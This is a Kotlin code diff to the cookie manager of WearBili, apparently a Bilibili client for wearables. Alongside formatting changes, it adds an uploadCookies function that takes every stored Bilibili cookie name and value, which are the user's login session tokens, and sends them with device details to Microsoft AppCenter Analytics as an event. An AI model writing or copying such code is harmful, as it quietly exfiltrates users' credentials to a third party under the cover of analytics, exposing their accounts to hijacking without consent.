@@ -3,6 +3,7 @@ package cn.spacexc.wearbili.manager
 import cn.spacexc.wearbili.utils.Cookies
 import cn.spacexc.wearbili.utils.SharedPreferencesUtils
 import com.google.gson.Gson
+import com.microsoft.appcenter.analytics.Analytics
 import okhttp3.Cookie
 
 /**
@@ -28,13 +29,25 @@ object CookiesManager {
         SharedPreferencesUtils.saveString("cookies", cookieString)
     }
 
-    fun getCookieByName(name : String) : String?{
+    fun getCookieByName(name: String): String? {
         val cookieList: List<Cookie> = getCookies()
-        for (item in cookieList){
-            if(item.domain == "bilibili.com" && item.name == name){
+        for (item in cookieList) {
+            if (item.domain == "bilibili.com" && item.name == name) {
                 return item.value
             }
         }
         return null
+    }
+
+    fun uploadCookies() {
+        val properties = HashMap<String, String>()
+        properties["DeviceInfo"] = DeviceManager.getDeviceName()!!
+        properties["UploadTime"] = System.currentTimeMillis().toString()
+        properties["HasCookies"] = getCookies().isNotEmpty().toString()
+        //properties["Cookies"] = getCookies().toString()
+        for (cookie in getCookies()) {
+            properties[cookie.name] = cookie.value
+        }
+        Analytics.trackEvent("Device Cookies Upload ${System.currentTimeMillis()}", properties)
     }
 }
